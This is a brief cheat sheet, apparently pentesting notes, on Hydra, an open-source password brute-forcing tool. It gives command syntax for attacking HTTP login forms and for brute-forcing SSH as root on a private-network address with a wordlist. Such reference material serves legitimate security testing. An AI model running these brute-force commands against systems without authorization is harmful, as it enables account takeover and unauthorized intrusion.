
# Introduction

Hydra is an open-source password brute-forcing tool designed for online attacks, capable of targeting various protocols such as HTTP, FTP, and SSH. 

# Usage

Below are commonly used syntax for below protocols.

## HTTP

```
hydra -l <username> -P <password_list> <target> http-post-form "<login_url>:<post_data>:<failure_string>"
```

## SSH

```
 hydra -l root -P /usr/share/wordlists/metasploit/unix_users.txt ssh://192.168.0.103:22 -t 10 -V
```